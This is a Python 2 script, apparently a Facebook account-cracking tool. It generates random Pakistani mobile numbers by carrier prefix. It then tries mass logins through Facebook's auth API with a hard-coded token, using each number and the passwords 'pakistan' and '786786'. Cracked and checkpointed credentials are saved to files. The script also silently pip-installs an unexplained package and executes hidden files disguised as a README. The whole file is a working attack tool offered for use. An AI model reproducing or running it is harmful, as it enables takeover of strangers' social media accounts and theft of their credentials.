#!/usr/bin/python2
#coding=utf-8
#Author Muzamil
#NAM HE KAFII HAA...


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 muzamil.xo')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### Dev : Prince Arhaam
##### LOGO #####
logo='''
\033[1;91m
   
    __  _____  _______   ___    __  _________ 
   /  |/  / / / /__  /  /   |  /  |/  /  _/ / 
  / /|_/ / / / /  / /  / /| | / /|_/ // // /  
 / /  / / /_/ /  / /__/ ___ |/ /  / // // /___
/_/  /_/\____/  /____/_/  |_/_/  /_/___/_____/                                          
                                        
                                 
\033[1;90m [ NAAM TU SUNA HUGA ]

\x1b[1;92m=============================
\x1b[1;93m Coder + Author : Muzamil
\x1b[1;93m HAHA  : NAM HE KAFII HA
\x1b[1;93m FaceBook : Prince Arhaam
\x1b[1;93m Author2 : Alone
\x1b[1;92m=============================
\x1b[1;93m     ➾       NOTE !
\x1b[1;91m=======================================
\x1b[1;93m     ➾ DoNT TRy TO COPy ME BECAUS iM THE 0NE
\x1b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  

CorrectUsername = "Muzamil"
CorrectPassword = "Soomro"
 
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Prince Arhaam
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/profile.php?id=100066698491956/?app=fbl')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/profile.php?id=100066698491956/?app=fbl')


back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;92m         [ Muzamil { NAM HE KAFII HA } ]"
	print
        print "\033[1;91m          SELECT ANY ONE SIM NETWORK"
	print "\033[1;92m[1]\033[1;97m╼╼\033[1;93mMOBILINK     (Press 1)"
	print "\033[1;92m[2]\033[1;97m╼╼\033[1;93mTELENOR      (Press 2)"
	print "\033[1;92m[3]\033[1;97m╼╼\033[1;93mWARID        (Press 3)"
	print "\033[1;92m[4]\033[1;97m╼╼\033[1;93mUFONE        (Press 4)"
	print "\033[1;92m[5]\033[1;97m╼╼\033[1;93mZONG         (Press 5)"
	print "\033[1;92m[6]\033[1;97m╼╼\033[1;93mUPDATE SYSTEM"
	print "\033[1;92m[0]\033[1;97m╼╼\033[1;91mEXIT   (Back) "	    
	print 50*'\033[1;90m-'
	action()
	
def action():	
	bch = raw_input('\n\033[1;92mSELECT ANY ONE NETWORK NUMBER \033[1;95m▶▶▶▶▶ \033[1;97m ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\033[1;91m\x1b[1;93mMOBILINK/JAZZ CODE HERE\x1b[1;92m◈◈◈◈◈"		
		print "\033[1;91m00, 01, 02, 03, 04,"
		print "\033[1;91m05, 06, 07, 08, 09,"
		try:
			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m:\033[1;97m ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print (logo)
		print "\033[1;91m\033[1;91mTELENOR CODE HERE\x1b[1;92m◈◈◈◈◈"		
		print "\033[1;91m40, 41, 42, 43, 44,"
		print "\033[1;91m45, 64, ??, ??, ??,"
		try:
			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print (logo)
		print "\033[1;91m\033[1;96mWARID CODE HERE\x1b[1;92m◈◈◈◈◈"		
		print "\033[1;91m20, 21, 22, 23,"
		print "\033[1;91m24, ??, ??, ??,"
		try:
			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":			
		os.system("clear")
		print (logo)
		print "\033[1;91m\033[1;91mUFONE CODE HERE\x1b[1;92m◈◈◈◈◈"		
		print "\033[1;91m31, 32, 33, 34,"
		print "\033[1;91m35, 36, 37, ??,"
		try:
			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines(): 
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="5":			
		os.system("clear")
		print (logo)
		print "\x1b[1;91m\033[1;95mZONG CODE HERE\x1b[1;92m◈◈◈◈◈"		
		print "\033[1;91m10, 11, 12, 13,"
		print "\033[1;91m14, 15, 16, 17,"
		try:
			c = raw_input(" \033[1;91m◢◀\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m▶◣ \033[1;97m: \033[1;97m")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" This Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .muzamil.xo")
#	elif chb =='3':	
#	    os.system('xdg-open https://www.facebook.com/profile.php?id=100066698491956/?app=fbl')
#	    time.sleep(1)
#	    menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[✓] \033[1;96mTotal Numbers: '+xxx)
	time.sleep(0.5)
	psb ('[✓] \033[1;96mPlease wait, process is running ...')
	time.sleep(0.5)
	psb ('[✓] \033[1;96mif U show No Result Use 5 Second Airplane Mode ...')
	time.sleep(0.5)
	psb ('[!] \033[1;96mPress CTRL Then Press Z To Stop This Process')
	time.sleep(0.5)
	print 50*'\033[1;90m-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[ MA=OK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;95mMuzamil PA \x1b[1;95m[CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:	
					pass2 = 'pakistan'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[ MA=OK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:	
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;95mMuzamil PA \x1b[1;95m[CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:	
							pass3 = '786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[ MA=OK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;95mMuzamil PA \x1b[1;95m[CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()
	





